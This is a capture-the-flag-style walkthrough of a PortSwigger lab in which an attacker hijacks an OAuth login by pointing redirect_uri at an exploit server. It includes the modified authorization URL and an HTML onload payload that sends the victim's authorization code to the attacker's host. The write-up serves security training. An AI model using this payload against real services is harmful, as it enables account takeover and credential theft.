
# 2 - OAuth account hijacking via redirect_uri

This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete Carlos.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in with your own social media account using the following credentials: wiener:peter.

------------------------------------------------

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/1.png)

Reference: https://portswigger.net/web-security/oauth

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/2.png)

------------------------------------------------

Generated endpoint: https://0a0c001204d355fec1a39983009b007d.web-security-academy.net/

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/3.png)

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/4.png)

https://oauth-0a5f00ff04d45537c1f997b8025a00a0.oauth-server.net/auth?client_id=wkw7zy0gcxh46yxashxrk&redirect_uri=https://0a0c001204d355fec1a39983009b007d.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email


https://oauth-0a5f00ff04d45537c1f997b8025a00a0.oauth-server.net/auth?client_id=wkw7zy0gcxh46yxashxrk&redirect_uri=https://exploit-0a4c00770488559fc1e198fb01180071.exploit-server.net&response_type=code&scope=openid%20profile%20email

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/5.png)

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/6.png)

Follow redirection:

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/7.png)

Access logs:

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/8.png)

Payload to open the link:
<body onload="window.open('https://oauth-0a5f00ff04d45537c1f997b8025a00a0.oauth-server.net/auth?client_id=wkw7zy0gcxh46yxashxrk&redirect_uri=https://exploit-0a4c00770488559fc1e198fb01180071.exploit-server.net/&response_type=code&scope=openid%20profile%20email')">

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/9.png)


Deliver exploit to victim:

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/10.png)
  
Log out, log in and replace the code with this one:

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/11.png)

After the last request, you get admin access:

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/12.png)

Admin panel:

![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/14.png)
  
![](images/2%20-%20OAuth%20account%20hijacking%20via%20redirect_uri/15.png)
